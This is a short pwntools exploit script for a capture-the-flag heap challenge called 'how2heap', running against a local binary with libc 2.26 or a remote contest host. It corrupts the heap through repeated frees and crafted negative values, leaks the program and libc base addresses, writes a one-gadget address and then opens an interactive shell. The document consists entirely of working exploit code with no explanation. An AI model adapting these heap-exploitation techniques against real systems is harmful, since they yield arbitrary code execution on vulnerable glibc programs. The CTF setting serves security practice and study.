#!/usr/bin/env python
from pwn import *

def line():
    s.sendlineafter('Choice: ', '0')

def do():
    s.sendlineafter('Choice: ', '1')

def make(name,age):
    s.sendlineafter('Choice: ', '2')
    s.sendlineafter('name? ', name)
    s.sendlineafter('age? ', str(age))

def delete():
    s.sendlineafter('Choice: ', '3')

def quit():
    s.sendlineafter('Choice: ', '9')

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./how2heap', env = {'LD_PRELOAD': './libc-2.26.so'})
    else:
        s = remote('challenges1.uiuc.tf', 38910)

    onegadgets = [0x47c46, 0x47c9a, 0xfccde, 0xfdb8e]
    
    make('A' * 7, 1)
    make('A' * 7, 1)
    make('A' * 7, 1)
    delete()
    delete()
    delete()
    delete()
    make('A' * 7, -0x9)
    line()
    delete()
    delete()
    s.recvline()
    text_base = u64(s.recvuntil(', ')[:-2].ljust(8,'\0')) - 0x123c
    log.info('text base: %#x' % text_base)
    do()
    delete()
    s.recvline()
    libc_base = u64(s.recvuntil(', ')[:-2].ljust(8,'\0')) - 0x3db720
    log.info('libc base: %#x' % libc_base)

    do()
    delete()
    delete()
    delete()
    make('A' * 7, (-1<<63) + 0x10)
    make(p64(libc_base + onegadgets[3])[:-1], u64('B' * 7 + '\0'))
    quit()
    s.interactive()
